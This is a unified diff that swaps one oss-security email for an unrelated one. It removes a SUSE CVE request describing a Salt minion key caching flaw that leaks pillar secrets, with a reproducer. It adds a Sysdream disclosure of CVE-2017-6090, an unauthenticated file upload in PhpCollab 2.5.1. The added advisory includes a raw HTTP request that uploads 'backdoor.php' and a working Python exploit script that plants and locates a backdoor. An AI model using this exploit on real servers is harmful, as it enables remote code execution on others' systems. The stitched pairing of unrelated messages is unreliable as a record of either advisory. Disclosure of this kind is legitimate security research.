@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5333" "Friday" "25" "November" "2016" "09:02:28" "+0100" "Johannes Segitz" "jsegitz@suse.com" "<20161125080228.GE31181@suse.com>" "173" "[oss-security] CVE Request: salt confidentiality issue" nil nil nil "11" "2016112508:02:28" "[oss-security] CVE Request: salt confidentiality issue" (number mark "U       jsegitz@suse Nov 25  173/5333  " thread-indent "\"[oss-security] CVE Request: salt confidentiality issue\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5302" "Friday" "29" "September" "2017" "16:31:40" "+0200" "Sysdream Labs" "labs@sysdream.com" "<f608373d-34ce-2e55-a04f-965305be5ea9@sysdream.com>" "180" "[oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)" "^Cc:" nil nil "9" "2017092914:31:40" "[oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)" (number mark "U       labs@sysdrea Sep 29  180/5302  " thread-indent "\"[oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 22344 invoked by uid 550); 25 Nov 2016 13:29:09 -0000
+Received: (qmail 14335 invoked by uid 550); 29 Sep 2017 14:31:56 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,191 +11,208 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7418 invoked from network); 25 Nov 2016 08:02:42 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-Date: Fri, 25 Nov 2016 09:02:28 +0100
-From: Johannes Segitz <jsegitz@suse.com>
-To: OSS Security List <oss-security@lists.openwall.com>,
-	cve-assign@mitre.org
-Message-ID: <20161125080228.GE31181@suse.com>
+Received: (qmail 14273 invoked from network); 29 Sep 2017 14:31:56 -0000
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com F1FB61A0D5C
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
+	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1506695502;
+	bh=gIGbGqfUetV+v/9Cy5Svf7nTT5iHRvqJw/e8RKDzXdc=;
+	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
+	b=Ly9YmJVs9pbDPV4+qNda44JbylS3zUY8P1CxWeTqxigrAQfAHbGl8OtdrVg2HzUxj
+	 sVrMXO1fyM+MgUu0i2t9AS61VNipcZJwVYv9cAXUV/d2qfC850ievMyyCufJQOlBO1
+	 fVSqhogXQ568uGYHCNcA+dE5fWiqs2H/dmCKL3bI=
+X-Virus-Scanned: amavisd-new at sysdream.com
+Message-ID: <f608373d-34ce-2e55-a04f-965305be5ea9@sysdream.com>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.2.1
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="MIdTMoZhcV1D07fI"
-Content-Disposition: inline
-User-Agent: Mutt/1.5.24 (2015-08-30)
-Subject: [oss-security] CVE Request: salt confidentiality issue
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH"
+Cc: oss-security@lists.openwall.com
+Date: Fri, 29 Sep 2017 16:31:40 +0200
+From: Sysdream Labs <labs@sysdream.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload
+ (unauthenticated)
+To: fulldisclosure@seclists.org
 
---MIdTMoZhcV1D07fI
-Content-Type: text/plain; charset=iso-8859-1
-Content-Disposition: inline
+--AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH
+Content-Type: multipart/mixed; boundary="KOvHxhSkT3PxIa3fwVKes0Mp8jLuJIAuP";
+ protected-headers="v1"
+From: Sysdream Labs <labs@sysdream.com>
+To: fulldisclosure@seclists.org
+Cc: oss-security@lists.openwall.com
+Message-ID: <f608373d-34ce-2e55-a04f-965305be5ea9@sysdream.com>
+Subject: [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload
+ (unauthenticated)
+
+--KOvHxhSkT3PxIa3fwVKes0Mp8jLuJIAuP
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
 Content-Transfer-Encoding: quoted-printable
 
-Hello,
+# [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)
 
-Dario Leidi from the SUSE Manager Team identified an issue in Salt. Please
-issue a CVE for this.
+## Description
 
-We contacted the salt security team, according to their (very quick and
-friendly) reply this is fixed by the 'rotate_aes_key' parameter=20
-https://docs.saltstack.com/en/2015.8/ref/configuration/master.html#rotate-a=
-es-key.
-that was introduced in 2015.8.11 to correct this issue. It is on by
-default, so the user would have to change that to be vulnerable.
+PhpCollab is an open source web-based project management system, that enabl=
+es collaboration across the Internet.
 
-Darios detailed writeup:
+## Arbitrary File Upload
 
-- Overview
+The phpCollab code does not correctly filter uploaded file contents. An una=
+uthenticated attacker may upload and execute arbitrary code.
 
-Salt minions (clients), come with a descriptive id and a crypto key
-each. Attaching a minion to a master (server) boils down to "accepting
-its key" with a command on the master.
+**CVE ID**: CVE-2017-6090
 
-Now it can happen that after one minion is fully accepted, a second one
-presents itself to the master with the same id but different key. In
-that case, Salt will figure out that the key is different and reject the
-second minion, assuming it is an impostor.
+**Access Vector**: remote
 
-Due to Salt's caching mechanisms, I found out that under certain
-circumstances Salt commands can reach, read data from and write data to,
-both minions ("original" and "impostor"). That includes pillar data,
-which is supposed to be secret to a certain minion.
+**Security Risk**: Critical
 
-- Reproducer
+**Vulnerability**: CWE-434
 
-# run 1 salt-master machine [master]
-# run 2 salt-minion machine [minion1, minion2]
+**CVSS Base Score**: 10 (Critical)
 
-## 1. start the salt-master
-rcsalt-master start
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
 
-## 2. on both minions give to the minion_id the same value, like
-'minion-test'
-vim /etc/salt/minion_id
+### Proof of Concept
 
-## 3. start the salt-minion on the minion1
-rcsalt-minion start
+The following HTTP request allows an attacker to upload a malicious php fil=
+e, without authentication.
+Thus, a file named after `$id.extension` is created.
 
-## 4. accept the key on the master
-salt-key -a minion-test
+For example, a backdoor file can be reached at `http://phpCollab.lan/logos_=
+clients/1.php`.
 
-## 5. try a simple test command from the master
-salt 'minion-test' cmd.run 'cat /etc/machine-id'
+```
+POST /clients/editclient.php?id=3D1&action=3Dupdate HTTP/1.1
+Host: phpCollab.lan
+Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
+Accept-Language: fr,fr-FR;q=3D0.8,en-US;q=3D0.5,en;q=3D0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=3D---------------------------15=
+4934846911423734231554128137
+Content-Length: 252
 
-## 6. delete the key from the master
-salt-key -d minion-test
+-----------------------------154934846911423734231554128137
+Content-Disposition: form-data; name=3D"upload"; filename=3D"backdoor.php"
+Content-Type: application/x-php
 
-## 7. start the salt-minion on the minion2
+<?php phpinfo(); ?>
 
-## 8. accept the key on the master
-salt-key -a minion-test
+-----------------------------154934846911423734231554128137--
+```
 
-## 9. try a simple test command from the master
-salt 'minion-test' cmd.run 'cat /etc/machine-id'
 
-## 10. Here it is the bug: the minion1 is still accepted and responding.
-We could run any command for the minion2, but the minion1 will listen,
-execute and respond to them too, not only the accepted minion2.
-## real output
-/------------------------------------------------
-suma3pg:~ # salt 'minion-test' cmd.run 'cat /etc/machine-id'
-minion-test:
-    52c69eb9c1da2a459375571a9b81e400
-minion-test:
-    a44f29fe2e8feb459fb021c259d5485f
-------------------------------------------------/
-## expected output
-/------------------------------------------------
-suma3pg:~ # salt 'minion-test' cmd.run 'cat /etc/machine-id'
-minion-test:
-    a44f29fe2e8feb459fb021c259d5485f
-------------------------------------------------/
+### Vulnerable code
 
-## 11. in the end it get solved on its own, but ONLY IF the salt-master
-is restarted
-rcsalt-master restart
+The vulnerable code is found in `clients/editclient.php`, line 63.
 
-- Reproducer Part2 for pillar_data
+```
+$extension =3D strtolower( substr( strrchr($_FILES['upload']['name'], ".") =
+,1) );
+if(@move_uploaded_file($_FILES['upload']['tmp_name'], "../logos_clients/".$=
+id.".$extension"))
+{
+  chmod("../logos_clients/".$id.".$extension",0666);
+  $tmpquery =3D "UPDATE ".$tableCollab["organizations"]." SET extension_log=
+o=3D'$extension' WHERE id=3D'$id'";
+  connectSql("$tmpquery");
+}
+```
 
-## set a custom pillar on the server, valid only for 'minion-test'
-vim /usr/share/susemanager/pillar/top.sls
-/------------------------
-base:
- 'minion-test':
-   - data
-------------------------/
 
-mkdir /usr/share/susemanager/pillar/data
-vim /usr/share/susemanager/pillar/data/init.sls
-/------------------------
-data:
-  secret:
-    - value: 123456
-------------------------/
+### Exploit code
 
-## refresh pillar
-salt '*' saltutil.refresh_pillar
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
-## redo steps as described above
+import os
+import sys
+import requests
 
-## ask for pillar
-salt '*' pillar.items data
+if __name__ =3D=3D '__main__':
+    if (len(sys.argv) !=3D 4):
+        print("Enter your target, userid and path for file upload like : py=
+thon exploit.py http://www.phpCollabURL.lan 1 /tmp/test.php")
+        sys.exit(1)
 
-## real output
-/------------------------------------------------
-suma3pg:~ # salt 'minion-test' pillar.items data
-minion-test:
-    data:
-        secret:
-              value:
-                  123456
-minion-test:
-    data:
-        secret:
-              value:
-                  123456
-------------------------------------------------/
-## expected output
-/------------------------------------------------
-suma3pg:~ # salt 'minion-test' pillar.items data
-minion-test:
-    data:
-        secret:
-              value:
-                  123456
-------------------------------------------------/
+    target =3D "%s/clients/editclient.php?id=3D%s&action=3Dupdate" % (sys.a=
+rgv[1], sys.argv[2])
+    print("[*] Trying to exploit with URL : %s..." % target)
+    backdoor =3D {'upload': open(sys.argv[3], 'rb')}
+    r =3D requests.post(target, files=3Dbackdoor)
+    extension =3D os.path.splitext(sys.argv[3])[1]
+    link =3D "%s/logos_clients/%s%s" % (sys.argv[1], sys.argv[2], extension=
+ )
+    r =3D requests.get(link)
+    if r.status_code =3D=3D 200:
+        print("[OK] Backdoor link : %s" % link)
+    else:
+        print("[FAIL]Problem (status:%s) (link:%s)" % (r.status_code, link))
+```
 
-The result will be that private pillar_data are exposed to the old and
-rejected minion1 too.
+## Solution
 
--------
+Update to the latest version avalaible.
 
-Johannes
+## Affected versions
+
+* Version <=3D 2.5.1
+
+## Timeline (dd/mm/yyyy)
+
+* 27/08/2016 : Initial discovery.
+* 05/10/2016 : Initial contact.
+* 11/10/2016 : GPG Key exchange.
+* 19/10/2016 : Advisory sent to vendor.
+* 13/02/2017 : First fixes.
+* 15/02/2017 : Fixes validation by Sysdream.
+* 21/02/2017 : PhpCollab ask to wait before publish.
+* 21/06/2017 : New version has been released.
+* 29/09/2017 : Public disclosure.
+
+## Credits
+
+* Nicolas SERRA, Sysdream  (n.serra -at- sysdream -dot- com)
+
 --=20
-GPG Key E7C81FA0       EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
-Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
-SUSE Linux GmbH, GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
-HRB 21284 (AG N=FCrnberg)
+SYSDREAM Labs <labs@sysdream.com>
 
---MIdTMoZhcV1D07fI
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+--KOvHxhSkT3PxIa3fwVKes0Mp8jLuJIAuP--
+
+--AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH
 Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: Digital signature
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
 
 -----BEGIN PGP SIGNATURE-----
 
-iQIcBAEBCgAGBQJYN/AUAAoJELwn3Z0sxP1mSrsQAKuzDE5eug5LTxcB7RxK8G9+
-WgQsGf8di8lSqeRUGb6dNzA2M6ZMGfncgO8bute56FHmzEZDrAh7T7sFpkDXxlyA
-qjK8kQ3pWTz33maqTHCFXtZVOso8Tlpv/B4acAC6m7KQwoCI0cIXdECHl3+Cu5VC
-NTSKoXNfApzVZETpb6Ba6BS2YumgUI3Xc+BeJoCiCLfPiElzyE4KHRjfcF/tf+GX
-R18x4mROhrDDigrmMviWvtOzDRLOY9rcRCLdN+QsAZtd55r5otiNx02et3muRjl8
-ZequHLWseFT+QqRawCwHlGFwA+dZLu74ZYvnvZRS2brwPvUF5zxryjOxSaRnzkLG
-DAoMaKEE3tsDcNRW0KD2yMZXJHuzlOzC2jAVHRDKfH4S21/xcBf3DWV7jvSb5far
-c9H5t/d7bWllckcPEWoj7B0ShjOgIG9yWuXI/2j5vXTQmWHXg+6odLRBVNO/Fsd8
-fp/LEmXryTWZ7/qf6+zGKaARFTvrvaTJwQC+LA979e85O4KNbI9dGpywmefcDK/N
-h5BVqz2QsbaPHWHArdeehtZHwvFUDLFpbGgLF7R8bEsrhoWNy7/XVqp1Gzmx/J3g
-n4kAyqPLmU72IVXxP5LyigSWi1goTeFarCMwZzLRzfgFJ4nWX/pwuLOIcloiOogS
-YAn9rgU6tywbMsJlq8LV
-=r7SD
+iQIzBAEBCAAdFiEER9HhJMQ++ZIqLhVRjrSM2dWyWaEFAlnOWUwACgkQjrSM2dWy
+WaEJlA/7ByETDWiArtGu4ZnxvXHewFteut/+45R984368wn3p6HGlgfRZtZnHGfX
+4awvi+P9Geh9N+DX7sIfpkasWQ+2CoXBdOG1L37FiVEoxCFEeP4OvP0npHPbMZsw
+FiZPog4+rbTRs5KN/ipbVoiHqttJysVhvvGf1CqkhkedM2yY1boUiZ0EbWPf+ghi
+1n3zQDo2tEaOjfxTvy4SWi3XjwumFT1mBDvL2yXM2KBMQNayoxYtxQnfn+Gj7io7
+xYnuvfPQE9uI0JSJ8qnptNYQ93bHHvY0oSTOlVGkVOvdMYzaSvPDolU4+ZpRgi86
+gjzXEJn2ShuanRbUx2KQV4r4zOFZqc52VL5lHlrE/m2GbUxDeWI5p584I6KDQQIE
+wHQaXBYDh91Kgce5hVyU3XO4+5DyyQ4NvH4/zioWD0vZdnbsM1QmcP+fu44uhcqI
+Z5b21cgsetxhshvFPkww0Zl8aN6BatBGQGxhmOHE1gCwXkT0D+Nb1NBJFFP1OLpj
+WE9ipURuxLhpMNkjTQbPY0g+2n0V7d4+CDSrhlVgonAdX4uDbfC2idgrZUvm61Op
+9IPEceActDGGQJn2rdBCcoMZANAf0TdRQaTGjSNVN46dGz4gerllugKt+BzbIDeI
+g4HZTEjQ8LU4hbt6lqyZEO29UlxOCqznDYwEQDEHSYfy01xmq6Q=
+=Masr
 -----END PGP SIGNATURE-----
 
---MIdTMoZhcV1D07fI--
+--AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH--
